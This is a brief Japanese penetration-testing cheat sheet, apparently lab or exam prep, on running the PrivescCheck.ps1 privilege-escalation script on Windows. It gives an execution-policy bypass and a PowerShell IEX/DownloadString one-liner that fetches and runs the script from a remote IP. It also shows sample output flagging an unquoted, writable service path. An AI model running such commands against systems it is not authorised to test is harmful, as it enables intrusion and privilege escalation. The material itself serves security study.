# PrivilegeCheck

### PrivescCheck.ps1

```
locate PrivescCheck.ps1
```

転送して実行

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

インメモリで実行

* 末尾に追加

![image-20230219222414202](img/PrivilegeCheck/image-20230219222414202.png)

* powershellを実行

```powershell
powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://192.168.45.211/PrivescCheck.ps1')
```





unquotedのパスで、かつ、フォルダの書き込み権限があり、start/stop可能もしくはAutorunの場合に特権昇格できる可能性がある

```cmd
Name              : Service1
ImagePath         : C:\program files\zen\zen services\zen.exe
User              : zensvc@exam.com
ModifiablePath    : C:\program files\zen\zen services\zen.exe
IdentityReference : BUILTIN\Users
Permissions       : WriteAttributes, Synchronize, AppendData, WriteExtendedAttributes, WriteData
Status            : Stopped
UserCanStart      : False
UserCanStop       : False

-----

Name        : Service1
DisplayName : ZenHelpDesk
ImagePath   : C:\program files\zen\zen services\zen.exe
User        : zensvc@exam.com
StartMode   : Automatic
```



* winPEAS

  